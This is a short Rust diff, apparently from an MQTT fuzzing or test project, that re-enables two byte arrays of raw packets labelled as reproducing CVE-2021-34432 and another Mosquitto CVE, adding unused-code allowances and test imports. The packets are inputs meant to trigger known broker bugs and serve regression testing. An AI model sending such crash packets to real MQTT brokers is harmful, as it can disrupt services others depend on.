@@ -1,8 +1,8 @@
 //! Here are packets from previously discovered CVEs
 
 use crate::MAX_PACKETS;
-/*
 /// https://www.cvedetails.com/cve/CVE-2021-34432/
+#[allow(unused)]
 const CVE_2021_34432: &[&[u8]; MAX_PACKETS] = &[
     &[
         16, 60, 0, 4, 77, 81, 84, 84, 4, 4, 0, 0, 0, 17, 72, 101, 108, 108, 111, 32, 77, 81, 84,
@@ -19,6 +19,7 @@ const CVE_2021_34432: &[&[u8]; MAX_PACKETS] = &[
     &[],
     &[],
 ];
+#[allow(unused)]
 const OTHER_MOSQUITTO_CVE: &[&[u8]; MAX_PACKETS] = &[
     &[
         16, 96, 0, 4, 77, 81, 84, 84, 5, 192, 93, 85, 34, 21, 0, 15, 98, 99, 82, 85, 100, 109, 83,
@@ -41,9 +42,10 @@ const OTHER_MOSQUITTO_CVE: &[&[u8]; MAX_PACKETS] = &[
     &[],
     &[],
 ];
-*/
 mod tests {
     use super::*;
+    use crate::packets::{PacketQueue, Packets};
+    use std::fs::write;
 
     #[test]
     fn nanomq_bug() {
